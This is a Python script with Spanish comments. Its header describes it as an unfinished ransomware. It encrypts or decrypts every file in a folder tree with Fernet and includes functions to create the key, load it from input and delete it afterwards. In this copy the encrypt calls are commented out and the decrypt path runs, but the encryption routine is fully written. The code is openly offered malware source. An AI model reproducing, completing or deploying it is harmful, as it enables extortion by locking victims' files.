#Este programa hará un ransomware
#Esta a falta de completar y mejorar...

import  os
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


archivos_total = []
rutas = []

#aqui se pone la clave que sirve para desencriptar los archivos
clave_desencriptar = ""


#Lee los archivos de una ruta
def archivos_carpetas(carpeta):
    
    for archivos in os.listdir(carpeta):
        archivos_total.append(archivos)

#Crea una clave (solo ejecutar una vez)
def crear_clave():
    llave = Fernet.generate_key()

    with open("clave.key", "wb") as clave_archivo:
         clave_archivo.write(llave)

#Carga la clave creada anteriormente
def cargar_clave():
    global clave_desencriptar
    clave_desencriptar = input(b"Introduce la clave para desincriptar: ")
    return clave_desencriptar
    

#Esta funcion borrara la clave una vez se termine
def borrar_clave():
    os.remove("clave.key")

def encriptar(ruta, archivo_elegido, clave):
    global f
    for i in archivo_elegido:
        try:

            with open(ruta + "\\" + i, "rb") as dato:
                info = dato.read()
            encriptar_dato = f.encrypt(info)
            with open(ruta + "\\" + i, "wb") as dato:
                dato.write(encriptar_dato)
        except:
            None

def desencriptar(ruta, archivo_elegido, clave):
    global f
    for i in archivo_elegido:

        try:

            with open(ruta + "\\" + i, "rb") as dato:
                info = dato.read()
            desencriptar_dato = f.decrypt(info)
            with open(ruta + "\\" + i, "wb") as dato:
                dato.write(desencriptar_dato)
        except:
            None


clave = cargar_clave()

f = Fernet(clave)


ruta = "ruta_carpeta_archivos_a_desencriptar"
ruta_original = ruta
archivos_carpetas(ruta)

def directorios(ruta, archivos_total, ruta_original):

    archivos_carpetas(ruta)
    archivo_elegido = archivos_total


    desencriptar(ruta, archivo_elegido, clave)

    lista_carpetas = []

    for dirpath, dirnames, filenames in  os.walk(ruta):
        for c in dirnames:
            lista_carpetas.append(c)

   
    #Máximo 6 carpetas... :c
    for dirpath, dirnames, filenames in os.walk(ruta):

        try:
            try: 
             for i in dirnames:
                 archivos_carpetas(ruta + "\\" + i)
                 ruta = ruta + "\\" + i
                 archivo_elegido = archivos_total
                 #encriptar(ruta, archivo_elegido, clave)
                 desencriptar(ruta, archivo_elegido, clave)
                 
                 

                 ruta = ruta_original



            except:
                for c in lista_carpetas:
                        try: 
                            
                            archivos_carpetas(ruta + "\\" + c + "\\" + i)
                            ruta = ruta + "\\" + c + "\\" + i
                            archivo_elegido = archivos_total
                            #encriptar(ruta, archivo_elegido, clave)
                            desencriptar(ruta, archivo_elegido, clave)
                            ruta = ruta_original

                        except:
                            for q in lista_carpetas:
                                try: 
                                    
                                    archivos_carpetas(ruta + "\\" + q + "\\" + c + "\\" + i)
                                    ruta = ruta + "\\" + q + "\\" + c + "\\" + i
                                    archivo_elegido = archivos_total
                                    #encriptar(ruta, archivo_elegido, clave)
                                    desencriptar(ruta, archivo_elegido, clave)
                                    ruta = ruta_original
                                except:
                                    for w in lista_carpetas:
                                    
                                        try: 
                                    
                                             archivos_carpetas(ruta + "\\" + w + "\\"  + q + "\\" + c + "\\" + i)
                                             ruta = ruta + "\\" + w + "\\"  + q + "\\" + c + "\\" + i
                                             archivo_elegido = archivos_total
                                             #encriptar(ruta, archivo_elegido, clave)
                                             desencriptar(ruta, archivo_elegido, clave)
                                             ruta = ruta_original

                                        except:
                                             for e in lista_carpetas:

                                                 try: 
                                    
                                                     archivos_carpetas(ruta + "\\" + e + "\\" + w + "\\"  + q + "\\" + c + "\\" + i)
                                                     ruta = ruta + "\\" + e + "\\" + w + "\\"  + q + "\\" + c + "\\" + i
                                                     archivo_elegido = archivos_total
                                                     #encriptar(ruta, archivo_elegido, clave)
                                                     desencriptar(ruta, archivo_elegido, clave)
                                                     ruta = ruta_original

                                                 except:
                                                     for r in lista_carpetas:

                                                         try:
                                                             archivos_carpetas(ruta + "\\" + r + "\\" + e + "\\" + w + "\\"  + q + "\\" + c + "\\" + i)
                                                             ruta = ruta + "\\" + r + "\\" + e + "\\" + w + "\\"  + q + "\\" + c + "\\" + i
                                                             archivo_elegido = archivos_total
                                                             #encriptar(ruta, archivo_elegido, clave)
                                                             desencriptar(ruta, archivo_elegido, clave)
                                                             ruta = ruta_original

                                                         except:
                                                             None


            
        except:
            None


#desencriptar
archivo_elegido = archivos_total

directorios(ruta, archivos_total, ruta_original)

print("Se ha desencriptado todo...")
